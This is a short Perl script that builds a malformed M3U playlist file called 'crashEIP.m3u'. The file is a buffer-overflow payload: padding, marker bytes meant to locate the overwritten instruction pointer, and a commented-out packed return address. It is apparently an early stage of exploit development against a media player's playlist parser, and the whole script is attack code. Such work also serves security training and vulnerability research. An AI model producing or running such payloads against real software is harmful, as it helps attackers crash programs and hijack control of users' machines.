$file= "crashEIP.m3u";
$buffer= "\\";
$buffer .="A" x 137;
#$buffer .= pack('V',0x7E429353);
$buffer .="CCCC";
$buffer .="DDDD";
$buffer .="EEEE";
$buffer .="FFFF" x 50;
$buffer .="G"x 2000;

open($FILE,">$file");
print $FILE $buffer;
close($FILE);
